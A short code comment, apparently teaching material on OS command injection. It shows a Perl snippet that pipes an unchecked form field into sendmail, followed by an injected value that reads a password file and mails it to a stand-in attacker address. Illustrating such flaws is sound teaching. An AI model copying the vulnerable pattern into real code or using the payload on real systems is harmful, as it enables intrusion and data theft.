/**
  处理表单内容
  my $adr = $q -> param('mailaddress');
  open(MAIL, "| /usr/sbin/sendmail $adr");
  print MAIL "From: info@example.com\n";
*/

// 如邮件地址如下，则会造成OS攻击
// ; cat /stc/passwd | mail hack@example.jp
